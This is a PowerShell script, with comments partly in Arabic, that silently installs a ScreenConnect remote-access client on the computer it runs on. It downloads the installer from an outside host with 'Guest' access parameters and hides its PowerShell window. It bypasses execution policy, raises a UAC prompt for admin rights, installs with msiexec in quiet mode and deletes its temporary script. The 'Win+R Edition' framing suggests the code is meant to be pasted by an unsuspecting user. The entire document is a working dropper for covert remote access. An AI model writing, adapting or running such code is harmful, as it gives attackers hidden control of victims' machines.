# ============================================================
#  ScreenConnect Silent Installer - Win+R Edition
#  - Hides PowerShell window
#  - Shows UAC once (unavoidable)
#  - Everything else silent
# ============================================================

$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"

# ============================================================
#  كشف: هل إحنا شغالين من Win+R؟
# ============================================================
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin     = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============================================================
#  لو مش Admin → نحفظ السكربت ونشغله بـ UAC
# ============================================================
if (-not $isAdmin) {

    # --- كود السكربت بصلاحيات Admin ---
    $elevatedScript = @'
$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"
$ResultFile   = Join-Path $env:TEMP "SC_Install_Result.txt"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Message"
    Add-Content -Path $ResultFile -Value $line -Encoding UTF8
}

function Try-Download {
    param($Dir)
    if (-not (Test-Path $Dir)) {
        Write-Log "Directory '$Dir' does not exist."
        return $null
    }
    $target = Join-Path $Dir $FileName
    try {
        Write-Log "Trying to download to: $target"
        Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -ErrorAction Stop
        if (-not (Test-Path $target)) { throw "File not found after download." }
        $size = (Get-Item $target).Length
        Write-Log "Downloaded size: $size bytes"
        if ($size -lt 100KB) { throw "File too small, likely invalid." }
        return $target
    }
    catch {
        Write-Log "Failed to download to '$Dir': $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

try {
    Write-Log "=== Installation started ==="

    $MsiPath = Try-Download -Dir $PrimaryDir
    if (-not $MsiPath) {
        Write-Log "Falling back to TEMP folder..."
        $MsiPath = Try-Download -Dir $FallbackDir
    }
    if (-not $MsiPath -or -not (Test-Path $MsiPath)) {
        throw "Could not download MSI to either C:\ or TEMP."
    }
    Write-Log "MSI downloaded at: $MsiPath"

    # التحقق من التوقيع
    $bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
    $signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    if ($signature -ne "D0CF11E0") {
        throw "File is not a valid MSI. Signature: $signature"
    }
    Write-Log "File signature OK (valid MSI)."

    $LogPath = Join-Path (Split-Path $MsiPath -Parent) $LogName
    Write-Log "Install log will be at: $LogPath"

    Write-Log "Installing silently..."
    $arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$LogPath`""
    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $arguments -Wait -PassThru -NoNewWindow
    Write-Log "msiexec ExitCode: $($proc.ExitCode)"

    if ($proc.ExitCode -eq 0 -or $proc.ExitCode -eq 3010) {
        Write-Log "SUCCESS: ScreenConnect installed."
        exit 0
    } else {
        Write-Log "FAILED. ExitCode=$($proc.ExitCode). Check log: $LogPath"
        exit $proc.ExitCode
    }
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    exit 1
}
'@

    # --- حفظ السكربت ---
    $tempScript = Join-Path $env:TEMP "SC_Elevated_$(Get-Random).ps1"
    Set-Content -Path $tempScript -Value $elevatedScript -Encoding UTF8

    # --- تشغيل PowerShell مخفي تمامًا + UAC ---
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
        $psi.Verb            = "RunAs"
        $psi.UseShellExecute = $true
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow  = $true

        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit()

        # تنظيف
        Start-Sleep -Seconds 2
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue

        exit $proc.ExitCode
    }
    catch {
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        exit 1
    }
}

# --- لو إحنا أصلاً Admin ---
Write-Host "Already running as Administrator."
